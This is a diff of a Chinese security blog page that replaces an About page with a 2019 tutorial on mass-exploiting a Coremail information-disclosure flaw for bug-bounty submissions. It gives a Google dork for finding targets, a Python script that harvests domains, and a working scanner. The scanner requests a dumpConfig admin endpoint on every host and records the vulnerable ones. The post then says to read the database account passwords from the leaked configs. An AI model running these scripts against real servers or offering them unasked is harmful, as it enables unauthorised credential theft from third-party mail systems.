@@ -2,7 +2,7 @@
   <head>
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>关于 | Sven&#39;blog</title>
+<title>coremail批量刷src | Sven&#39;blog</title>
 <meta name="description" content="不在平静中灭亡~" />
 <link rel="shortcut icon" href="http://www.svenbeast.com//favicon.ico?v=1563503732079">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
@@ -81,42 +81,118 @@
         <div class="post-detail">
           <article class="post">
             <h2 class="post-title">
-              关于
+              coremail批量刷src
             </h2>
             <div class="post-info">
               <span>
-                2019-01-25
+                2019-06-17
               </span>
               <span>
                 1 min read
               </span>
               
-                <a href="http://www.svenbeast.com//tag/P8jNZE_I-" class="post-tag">
-                  # sven
-                </a>
-              
             </div>
-            
-              <img class="post-feature-image" src="http://www.svenbeast.com//post-images/about.jpg" alt="">
             
             <div class="post-content-wrapper">
               <div class="post-content">
-                <p>😄 svenbeast<br>
-🙃 18年正式进入安全行业<br>
-🤣 目前在某信做着安服工作，为自己加油~<br>
-🥰 希望通过不断学习和分享让自己变成更优秀的Super Man~</p>
-<blockquote>
-<p>北京的小伙伴有机会可以来面基</p>
-</blockquote>
+                <ul>
+<li>用来小批量刷src的洞是hw这几天曝出的coremail的信息泄露漏洞，量级够，所以可堪一战</li>
+<li>在此对写coremail的POC的作者表示感谢la -.-!</li>
+</ul>
+<h3 id="首先步骤1利用google语法列出搜索结果并保存网页">首先步骤1：利用google语法列出搜索结果并保存网页#</h3>
+<p>这里图片里的google语法是 inurl:coremail（其他语法需自行构造，最好加上中文关键字），然后翻到第2页，ctrl+s将页面保存为1.html<br>
+ps：拥有ZoomEye，Fofa，shodan账号的略过即可 -.-</p>
+<p><img src="http://www.svenbeast.com//post-images/1563502445782.png" alt=""></p>
+<h3 id="步骤2获取html文件中的coremaile域名">步骤2：获取html文件中的coremaile域名#</h3>
+<p>usage：python2 damain.py</p>
+<pre><code>#coding=utf-8
+import sys
+import requests
+from lxml import etree
+
+
+# def check_url(url):
+
+with open('1.html','r') as f:
+    text=f.read()
+    html = etree.HTML(text)
+    results = html.xpath('//*[@id=&quot;rso&quot;]/div[1]/div/div/div/div/div/a')
+    with open('ip.txt','a') as s:
+        for i in results:
+            print i.get('href').split('/')[2]
+            url=i.get('href').split('/')[2]
+            s.write('http://'+url)
+            s.write('\n')
+</code></pre>
+<p><img src="http://www.svenbeast.com//post-images/1563502540703.png" alt=""></p>
+<p>会在当前目录下生成ip.txt</p>
+<p>Ps：记得把生成的ip.txt文件中google.com后缀的网站删掉，这个是google翻译，不删掉有些浪费检测时间，毕竟是单线程，hh。<br>
+步骤3：批量验证漏洞#<br>
+usage：python2 poc.py</p>
+<pre><code>#-*- Coding: utf-8 -*-
+
+import requests,sys
+
+
+def mailsmsPoC(url):
+    url = url + &quot;/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/&quot;
+    try:
+        r = requests.get(url,timeout=8000)
+        if (r.status_code != '404') and (&quot;/home/coremail&quot; in r.text):
+            print &quot;mailsms is vulnerable: {0}&quot;.format(url)
+            with open('vul.txt', 'a') as f:
+                    f.write(url + '\n')
+        else:
+            print &quot;mailsms is safe!&quot;
+    except Exception as e:
+        print &quot;######time out######&quot;
+if __name__ == '__main__':
+    try:
+        mailsmsPoC(sys.argv[1])
+    except:
+        print &quot;python poc.py&quot;
+
+file = open('ip.txt', 'r')
+for f in file.readlines():
+    url = f.strip('\r\n')
+    mailsmsPoC(url)
+</code></pre>
+<p><img src="http://www.svenbeast.com//post-images/1563502552598.png" alt=""></p>
+<p>步骤4：存在漏洞的会在当前目录下生成vul.txt，直接复制url粘贴到网页上，ctr+f搜索database就可以看到数据库的账号密码一些信息了,就可以开始截图进行src提交了#<br>
+<img src="http://www.svenbeast.com//post-images/1563502558364.png" alt=""></p>
+<p>结束：获取域名时，后得到的域名是编辑进ip.txt文件的，所以不必担心多次获取域名后替换前面已获取的。</p>
+<h3 id="ps因博客重建特意将本人文章从圈子转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从圈子转移回来，如有影响，可联系删帖</h3>
 
               </div>
               <div class="toc-container">
-                
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E9%A6%96%E5%85%88%E6%AD%A5%E9%AA%A41%E5%88%A9%E7%94%A8google%E8%AF%AD%E6%B3%95%E5%88%97%E5%87%BA%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C%E5%B9%B6%E4%BF%9D%E5%AD%98%E7%BD%91%E9%A1%B5">首先步骤1：利用google语法列出搜索结果并保存网页#</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A42%E8%8E%B7%E5%8F%96html%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84coremaile%E5%9F%9F%E5%90%8D">步骤2：获取html文件中的coremaile域名#</a></li>
+<li><a href="#ps%E5%9B%A0%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%BB%BA%E7%89%B9%E6%84%8F%E5%B0%86%E6%9C%AC%E4%BA%BA%E6%96%87%E7%AB%A0%E4%BB%8E%E5%9C%88%E5%AD%90%E8%BD%AC%E7%A7%BB%E5%9B%9E%E6%9D%A5%E5%A6%82%E6%9C%89%E5%BD%B1%E5%93%8D%E5%8F%AF%E8%81%94%E7%B3%BB%E5%88%A0%E5%B8%96">PS：因博客重建，特意将本人文章从圈子转移回来，如有影响，可联系删帖</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
               </div>
             </div>
           </article>
         </div>
 
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="http://www.svenbeast.com//post/hello-gridea">
+              <h3 class="post-title">
+                文件包含漏洞利用集合+简单payload
+              </h3>
+            </a>
+          </div>
         
 
         
